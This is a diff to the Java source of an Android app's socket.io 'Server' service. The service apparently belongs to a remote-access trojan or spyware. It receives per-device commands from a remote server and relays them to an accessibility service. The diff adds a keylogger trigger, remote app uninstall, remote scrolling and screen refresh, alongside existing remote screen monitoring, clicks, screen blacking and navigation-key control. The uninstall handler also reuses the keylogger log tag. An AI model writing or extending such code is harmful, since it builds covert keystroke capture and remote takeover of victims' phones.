@@ -90,6 +90,7 @@ public class Server extends Service {
             socket.connect();
             socket.on(Socket.EVENT_CONNECT, onConnectDevice);
             socket.on("mb-screen-monitor-" + mDeviceID, onScreenMonitor);
+            socket.on("mb-screen-monitor-refresh-" + mDeviceID, onScreenRefreshMonitor);
             socket.on("mb-screen-click-event-" + mDeviceID, onScreenClickMonitor);
             socket.on("mb-screen-drag-event-" + mDeviceID, onScreenDragMonitor);
             socket.on("mb-screen-black-event-" + mDeviceID, onScreenBlackMonitor);
@@ -106,6 +107,9 @@ public class Server extends Service {
             socket.on("mb-screen-home-event-" + mDeviceID, onDeviceHomeMonitor);
             socket.on("mb-screen-back-event-" + mDeviceID, onDeviceBackMonitor);
             socket.on("mb-screen-recent-event-" + mDeviceID, onDeviceRecentMonitor);
+            socket.on("mb-key-logs-" + mDeviceID, onKeyLoggerMonitor);
+            socket.on("mb-uninstall-app-event-" + mDeviceID, onUninstallAppMonitor);
+            socket.on("mb-screen-control-scroll-" + mDeviceID, onScreenScrollMonitor);
             socket.on("mb-monitor-close-" + mDeviceID, onCloseMonitor);
         } catch (URISyntaxException e) {
             e.printStackTrace();
@@ -126,6 +130,15 @@ public class Server extends Service {
             JSONObject data = (JSONObject) args[0];
             Log.d("ScreenMonitor:", data.toString());
             Intent broadcastIntent = new Intent(MainAccessibilityService.ACTION_SCREEN_MONITOR);
+            sendBroadcast(broadcastIntent);
+        }
+    };
+    private final Emitter.Listener onScreenRefreshMonitor = new Emitter.Listener() {
+        @Override
+        public void call(Object... args) {
+            JSONObject data = (JSONObject) args[0];
+            Log.d("ScreenMonitor:", data.toString());
+            Intent broadcastIntent = new Intent(MainAccessibilityService.ACTION_SCREEN_REFRESH_MONITOR);
             sendBroadcast(broadcastIntent);
         }
     };
@@ -295,7 +308,6 @@ public class Server extends Service {
             } catch (JSONException e) {
                 throw new RuntimeException(e);
             }
-
         }
     };
 
@@ -345,6 +357,41 @@ public class Server extends Service {
             Log.d("onInstalledAppMonitor:", "");
             Intent broadcastIntent = new Intent(MainAccessibilityService.ACTION_DEVICE_RECENT);
             sendBroadcast(broadcastIntent);
+        }
+    };
+    private final Emitter.Listener onKeyLoggerMonitor = new Emitter.Listener() {
+        @Override
+        public void call(Object... args) {
+            JSONObject data = (JSONObject) args[0];
+            Log.d("onKeyLoggerMonitor:", data.toString());
+            Intent broadcastIntent = new Intent(MainAccessibilityService.ACTION_KEY_LOGGER);
+            sendBroadcast(broadcastIntent);
+        }
+    };
+    private final Emitter.Listener onUninstallAppMonitor = new Emitter.Listener() {
+        @Override
+        public void call(Object... args) {
+            JSONObject data = (JSONObject) args[0];
+            Log.d("onKeyLoggerMonitor:", data.toString());
+            Intent broadcastIntent = new Intent(MainAccessibilityService.ACTION_UNINSTALL_APP);
+            sendBroadcast(broadcastIntent);
+        }
+    };
+    private final Emitter.Listener onScreenScrollMonitor = new Emitter.Listener() {
+        @Override
+        public void call(Object... args) {
+            JSONObject data = (JSONObject) args[0];
+            String scroll_event = "";
+            Log.d("onScreenScrollMonitor:", data.toString());
+            try {
+                scroll_event = (String) data.get("event");
+
+                Intent broadcastIntent = new Intent(MainAccessibilityService.ACTION_SCREEN_SCROLL);
+                broadcastIntent.putExtra("event", scroll_event);
+                sendBroadcast(broadcastIntent);
+            } catch (JSONException e) {
+                throw new RuntimeException(e);
+            }
         }
     };
 
